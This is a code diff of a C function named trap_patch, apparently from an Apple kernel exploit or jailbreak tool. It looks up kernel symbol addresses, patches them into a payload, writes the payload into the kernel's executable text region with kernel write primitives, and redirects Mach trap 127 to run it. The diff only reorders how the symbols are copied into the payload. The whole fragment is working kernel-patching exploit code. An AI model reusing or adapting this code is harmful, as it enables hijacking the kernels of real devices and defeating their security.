@@ -158,7 +158,6 @@ void trap_patch() {
     uint64_t pmap_find_phys = kernel_find_symbol("_pmap_find_phys");
     uint64_t bcopy_phys = kernel_find_symbol("_bcopy_phys");
     printf("mach_traps: 0x%llx\n", mach_traps);
-    printf("text_exec_addr: 0x%llx\n", gKernelTextExec);
     printf("copyin: 0x%llx\n", copyin);
     printf("copyout: 0x%llx\n", copyout);
     printf("current_task: 0x%llx\n", current_task);
@@ -166,12 +165,6 @@ void trap_patch() {
     printf("pmap_find_phys: 0x%llx\n", pmap_find_phys);
     printf("bcopy_phys: 0x%llx\n", bcopy_phys);
     
-    // write payload
-    void* payload_symbols = memmem(payload, sizeof(payload), (uint64_t[]){0x4141414141414141}, 8);
-    if (payload_symbols == 0) return;
-    uint64_t payload_symbols_offset = payload_symbols - (void*)payload;
-    uint64_t rx = gKernelTextExec + 0x1000;
-    kwritebuf(rx, payload, sizeof(payload));
     uint64_t symbols[] = {
         gKernelSlide,
         copyin,
@@ -181,13 +174,17 @@ void trap_patch() {
         pmap_find_phys,
         bcopy_phys
     };
-    for (int i = 0; i < sizeof(symbols) / 8; i++) {
-        kwrite64(rx + payload_symbols_offset + (i * 8), symbols[i]);
-    }
+    
+    // write payload
+    uint64_t* payload_symbols = memmem(payload, sizeof(payload), (uint64_t[]){0x4141414141414141}, 8);
+    if (payload_symbols == 0) return;
+    memcpy(payload_symbols, symbols, sizeof(symbols));
+    uint64_t payload_addr = gKernelTextExec + 0x1000;
+    kwritebuf(payload_addr, payload, sizeof(payload));
 
     // write trap
     uint64_t trap_entry = mach_traps + (127 * trap_size);
-    kwrite64(trap_entry + 8, rx);
+    kwrite64(trap_entry + 8, payload_addr);
     kwrite64(trap_entry + 16, 0);
     if (trap_size == 32) {
         kwrite64(trap_entry, 7);
